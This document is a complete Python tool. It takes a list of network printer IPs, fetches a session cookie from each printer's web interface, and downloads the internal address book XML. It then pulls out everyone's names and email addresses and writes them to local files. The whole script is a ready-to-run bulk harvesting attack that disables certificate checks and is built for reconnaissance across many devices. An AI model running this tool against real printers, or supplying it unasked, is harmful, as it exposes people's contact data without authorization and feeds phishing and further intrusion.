#!/usr/bin/env python3
import argparse
import requests
import xml.etree.ElementTree as ET
import os

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def get_cookie(ip, use_https=False, debug=False):
    """Retrieve session cookie from the printer's index page, preferring HTTP first."""
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{ip}/wcd/index.html"

    try:
        response = requests.get(url, timeout=5, verify=False)  # Skip SSL verification
        response.raise_for_status()
        
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie'].split(';')[0]  # Extract only "ID=X"
            if debug:
                print(f"[DEBUG] Retrieved cookie from {protocol}://{ip} -> {cookie}")
            return cookie, protocol  # Return the working protocol
        else:
            if debug:
                print(f"[DEBUG] No cookie received from {protocol}://{ip}")
            return None, None

    except requests.exceptions.ConnectionError:
        if not use_https:
            print(f"[!] Connection failed on HTTP for {ip}, retrying with HTTPS...")
            return get_cookie(ip, use_https=True, debug=debug)
        else:
            print(f"[X] Connection failed on HTTPS for {ip}, skipping...")
            return None, None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Failed to reach {protocol}://{ip}: {e}")
        return None, None


def get_address_book(ip, cookie, protocol, debug=False):
    """Request the address book XML using the same protocol that worked for the cookie request."""
    url = f"{protocol}://{ip}/wcd/abbr.xml"
    headers = {'Cookie': cookie}

    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        response.raise_for_status()

        if debug:
            print(f"[DEBUG] Retrieved XML address book from {protocol}://{ip}, length: {len(response.text)}")
            print(f"[DEBUG] First 500 chars of response:\n{response.text[:500]}")

        return response.text

    except requests.exceptions.ConnectionError:
        if protocol == "http":
            print(f"[!] Connection failed retrieving XML from {ip} over HTTP, retrying with HTTPS...")
            return get_address_book(ip, cookie, "https", debug=debug)
        else:
            print(f"[X] Connection failed retrieving XML from {ip} over HTTPS, skipping...")
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Failed to retrieve XML from {protocol}://{ip}: {e}")
        return None


def parse_xml(xml_data, ip, debug=False):
    """Extract Name and Email from XML response, ensuring data is within <Address> → <AbbrList>."""
    parsed_data = []
    
    try:
        root = ET.fromstring(xml_data)

        # Locate <Address>
        address_block = root.find(".//Address")
        if address_block is None:
            if debug:
                print(f"[DEBUG] No <Address> tag found for {ip}. First 500 chars of response:\n{xml_data[:500]}")
            return []

        # Locate <AbbrList> inside <Address>
        abbr_list = address_block.find("AbbrList")
        if abbr_list is None:
            if debug:
                print(f"[DEBUG] No <AbbrList> found inside <Address> for {ip}. XML snippet:\n{xml_data[:500]}")
            return []

        for addr in abbr_list.findall("AddressKind"):
            # Get Name
            name_element = addr.find("Name")
            name = name_element.text.strip() if name_element is not None else "Unknown"

            # Get Email
            send_config = addr.find("SendConfiguration")
            email = "No Email"
            if send_config is not None:
                to_element = send_config.find("To")
                email = to_element.text.strip() if to_element is not None else "No Email"

            parsed_data.append((name, email))

            if debug:
                print(f"[DEBUG] Extracted Name: {name}, Email: {email}")

        return parsed_data

    except ET.ParseError as e:
        if debug:
            print(f"[DEBUG] Error parsing XML from {ip}: {e}")
        return []


def process_ip(ip, output_file, debug=False):
    """Handles the full process for a single IP."""
    cookie, protocol = get_cookie(ip, debug=debug)
    if not cookie:
        return
    
    xml_data = get_address_book(ip, cookie, protocol, debug=debug)
    if xml_data:
        address_list = parse_xml(xml_data, ip, debug=debug)
    else:
        address_list = []

    if address_list:
        with open(output_file, "a") as f:
            for name, email in address_list:
                f.write(f"{name},{email}\n")
        print(f"[+] Extracted {len(address_list)} records from {ip} into {output_file}")
    else:
        print(f"[!] No valid records found for {ip}")


def main():
    parser = argparse.ArgumentParser(description="Extract internal address books from network printers.")
    parser.add_argument("-i", "--input", help="File containing list of printer IPs", required=True)
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")

    args = parser.parse_args()
    
    if not os.path.exists(args.input):
        print(f"[!] Input file {args.input} not found.")
        return

    with open(args.input, "r") as file:
        ips = [line.strip() for line in file if line.strip()]
    
    for ip in ips:
        output_file = f"{ip}_addrbook.txt"
        process_ip(ip, output_file, debug=args.debug)


if __name__ == "__main__":
    main()
